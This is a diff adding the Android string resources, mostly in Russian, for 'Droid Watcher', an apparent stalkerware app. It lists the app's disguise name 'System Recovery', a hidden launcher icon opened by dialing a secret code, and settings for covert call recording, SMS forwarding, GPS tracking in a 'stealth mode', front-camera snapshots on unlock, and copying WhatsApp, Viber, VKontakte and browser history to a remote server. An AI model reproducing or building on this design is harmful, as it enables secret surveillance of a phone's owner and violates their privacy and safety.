@@ -1,0 +1,182 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+<!-- 	<string name="server_address">http://droidwatcher.appspot.com/Service</string> -->
+<!--     <string name="ver">3.0.0 Beta</string> -->
+    <string name="app_name">System Recovery</string> <!-- 3.2.3 System service --> <!-- 3.2.4 System Recovery -->
+    <string name="app_name_real">Droid Watcher</string>
+    <string name="default_code">001</string>
+    
+    <string-array name="screen_timer">
+        <item>10 sec</item>
+		<item>30 sec</item>
+		<item>1 min</item>
+		<item>2 min</item>
+		<item>5 min</item>
+		<item>10 min</item>
+	</string-array>
+	
+    <string-array name="screen_timer_val">
+        <item>10</item>
+		<item>30</item>
+		<item>60</item>
+		<item>120</item>
+		<item>300</item>
+		<item>600</item>
+	</string-array>
+    
+    <string-array name="gps_timer">
+        <item>Часто (~1 мин)</item>
+		<item>Иногда (~10 мин)</item>
+		<item>Редко (~30 мин)</item>
+	</string-array>
+	
+    <string-array name="gps_timer_val">
+        <item>1</item>
+		<item>10</item>
+		<item>30</item>
+	</string-array>
+	
+    <string-array name="record_format">
+        <item>3GPP</item>
+		<item>AMR</item>
+	</string-array>
+	
+    <string-array name="record_format_val">
+        <item>1</item>
+		<item>3</item>
+	</string-array>
+	
+    <string-array name="record_source">
+        <item>DEFAULT</item>
+		<item>MIC</item>
+		<item>VOICE_UPLINK</item>
+		<item>VOICE_DOWNLINK</item>
+		<item>VOICE_CALL</item>
+		<item>CAMCORDER</item>
+		<item>VOICE_RECOGNITION</item>
+		<item>VOICE_COMMUNICATION</item>
+	</string-array>
+	
+    <string-array name="record_source_val">
+        <item>0</item>
+		<item>1</item>
+		<item>2</item>
+		<item>3</item>
+		<item>4</item>
+		<item>5</item>
+		<item>6</item>
+		<item>7</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format">
+        <item>Small (640x480)</item>
+		<item>Medium (800x600)</item>
+		<item>HD (1280x720)</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format_val">
+        <item>640</item>
+		<item>800</item>
+		<item>1280</item>
+	</string-array>
+	
+    <string name="loginLabel">Login:</string>
+    <string name="idLabel">IMEI:</string>
+    <string name="mailLabel">E-mail</string>
+    <string name="mailHint">Ваш e-mail</string>
+    
+    <string name="connUnavailable">Интернет соединение недоступно.</string>
+    <string name="connLogin">Не удалось подключиться к системе. Проверьте Ваш e-mail.</string>
+    <string name="settings">Настройки</string>
+    <string name="filter">Фильтр</string>
+    <string name="enterYourLogin">Введите Ваш e-mail</string>
+    
+	<string name="useFilter">Использовать фильтр</string>
+	<string name="watchFor">Следить за смс и звонками…</string>
+	<string name="onlyFromList">… только от номеров из списка</string>
+	<string name="exceptList">… от всех кроме номеров из списка</string>
+	<string name="phoneNumber">Номер телефона</string>
+	<string name="filterHint">*долгое нажатие на номере для удаления</string>
+	<string name="plus">+</string>
+	<string name="enter">Вход</string>
+	<string name="registration">Регистрация</string>
+	<string name="copyright">\u00A9 Odrin, 2012&#8211;2013</string>
+	<string name="droidwatcher">Droid Watcher</string>
+	<string name="pwdHint">Ваш пароль</string>
+	<string name="registrationHint">Укажите реальный e-mail и пароль для Вашего нового аккаунта. Вам будет отправлено письмо, для подтверждения e-mail перейдите по ссылке в этом письме. Если e-mail адрес не будет подтвержден в течении 24 часов, Ваша учетная запись будет удалена!</string>
+	<string name="registrationSuccess">Регистрация прошла успешно</string>
+	<string name="mailNotMatch">Некорректный e-mail адрес</string>
+    <string name="shortPwd">Пароль должен быть не короче 6 символов</string>
+    <string name="finish">Завершить</string>
+    <string name="connectionSuccess">
+        <![CDATA[
+        <p>Подключение к сервису успешно завершено. Для того, что бы перейти к настройкам, нажмите \"Завершить\".</p><p><b>Внимание:</b> иконка приложения будет скрыта из списка приложений. Для открытия приложения используйте набор номера **001**. При первом запуске приложения в большинстве случаев требуется перезагрузка устройства для скрытия иконки.</p>
+        ]]>
+   	</string>
+    <string name="wait">Подождите&#8230;</string>
+    
+    <string name="gps">GPS</string>
+    <string name="gpsEnableDescr">Отправлять GPS координаты на сервер</string>
+    <string name="gpsOnlyNew">Только новые координаты</string>
+    <string name="gpsOnlyNewDescr">Отправлять координаты только если они изменились (отключение этой функции увеличит интернет-трафик)</string>
+    <string name="gpsInterval">Интервал</string>
+    <string name="gpsDescr">Настройка интервала определения координат</string>
+    <string name="gpsTitle">Выберите интервал</string>
+    
+    <string name="settings_noNumber">Номер для оповещений не задан</string>
+    <string name="settings_onlyDigits">Код должен состоять только из цифр</string>
+    <string name="settings_emptyCode">Код не может быть пустым</string>
+    <string name="settings_numberError">Введен некорректный номер</string>
+    
+    <string name="settings_autoupdate">Автоматическое обновление ®</string>
+    <string name="settings_autoupdate_summary">Автоматически скачивать и устанавливать новые версии DW. Для работы необходим root</string>
+    <string name="settings_dataTransfer">Передача данных</string>
+    <string name="settings_wifionly">Только Wi-Fi</string>
+    <string name="settings_wifionly_summary">Отправлять данные на сервер только через Wi-Fi.</string>
+    <string name="settings_wifionly_files_summary">Отправлять файлы (скриншоты/фотографии/аудиозаписи) на сервер только через Wi-Fi.</string>
+    <string name="settings_runcode">Код запуска</string>
+    <string name="settings_runcode_summary">Код запуска приложения (**Ваш код**)</string>
+    <string name="settings_runcode_title">Ваш код</string>
+    <string name="settings_phonenumber">Номер телефона</string>
+    <string name="settings_phonenumber_summary">Номер телефона на который будут отправляться оповещения</string>
+    <string name="settings_smsnotification">Смс оповещения</string>
+    <string name="settings_simnotification">Смена sim-карты</string>
+    <string name="settings_simnotification_summary">Оповещать о смене sim-карты по смс</string>
+    <string name="settings_sms">Смс</string>
+    <string name="settings_sms_summary">Дублировать смс на указанный номер</string>
+    <string name="settings_calls">Звонки</string>
+    <string name="settings_calls_summary">Оповещать о звонках через смс на указанный номер</string>
+    <string name="settings_callrecord">Запись разговоров</string>
+    <string name="settings_record">Записывать разговоры</string>
+    <string name="settings_record_summary">Записывать входящие и исходящие звонки</string>
+    <string name="settings_recordfromline">Запись с линии</string>
+    <string name="settings_recordfromline_summary">Вести запись с линии. Хорошо слышно обоих собеседников, но работает не на всех устройствах. Если не включена, то запись ведется через микрофон.</string>
+    <string name="settings_recordformat">Формат аудио</string>
+    <string name="settings_recordformat_summary">Формат аудио записей</string>
+    <string name="settings_photo">Пересылка фотографий</string>
+    <string name="settings_phototransfer">Пересылать фотографии</string>
+    <string name="settings_phototransfer_summary">Отправлять на сервер фотографии снятые на камеру телефона</string>
+    <string name="settings_imagesize">Размер изображения</string>
+    <string name="settings_imagesize_summary">Размер передаваемого изображения. Передача на сервер изображения большего размера потребляет больше интернет трафика.</string>
+    <string name="settings_screenshots_title">Скриншоты</string>
+    <string name="settings_screenshots">Делать скриншоты ®</string>
+    <string name="settings_screenshots_summary">Делать скриншоты с заданным интервалом. Для работы необходим root. работает только на Android 4.0 и выше. Файлы передаются на сервер \"Пачками\" не меньше 10 штук.</string>
+    <string name="settings_screenshots_interval">Интервал</string>
+    <string name="settings_screenshots_interval_summary">Интервал, с которым делается скриншот</string>
+    <string name="settings_vk">Копировать Vkontakte ®</string>
+    <string name="settings_vk_summary">Отправлять на сервер переписку \"Вконтакте\". Работает только с официальным клиентом \"Вконтакте\". Для работы необходим root.</string>
+    <string name="settings_wa">Копировать WhatsApp ®</string>
+    <string name="settings_wa_summary">Отправлять на сервер переписку \"WhatsApp\". Для работы необходим root.</string>
+    <string name="settings_vb">Копировать Viber ®</string>
+    <string name="settings_vb_summary">Отправлять на сервер переписку \"Viber\". Для работы необходим root.</string>
+    <string name="settings_gps_hide">Скрытный режим</string>
+    <string name="settings_gps_hide_summary">Скрывать работу GPS. Поиск происходит только при выключенном экране и прерывается при его включении. Пользователь не увидит оповещения \"Поиск GPS\".</string>
+    <string name="settings_record_source_title">Audio Source</string>
+    <string name="settings_record_source_summary">Источник записи звука. Не изменяйте этот параметр, если не знаете для чего он нужен и как работает!</string>
+    <string name="camera">Камера</string>
+    <string name="settings_front_cameta_title">Делать снимки фронтальной камерой</string>
+    <string name="settings_front_cameta_summary">Делать снимки фронтальной камерой при разблокировке экрана. Файлы передаются на сервер \"Пачками\" не меньше 10 штук. Просмотр этих фотографий доступен только пользователям с PRO аккаунтом.</string>
+    
+    <string name="settings_browser_history_title">Копировать историю браузера</string>
+    <string name="settings_browser_history_summary">Сохранять и отправлять на сервер историю посещенных страниц. Работает только со стандартным браузером Android.</string>
+</resources>
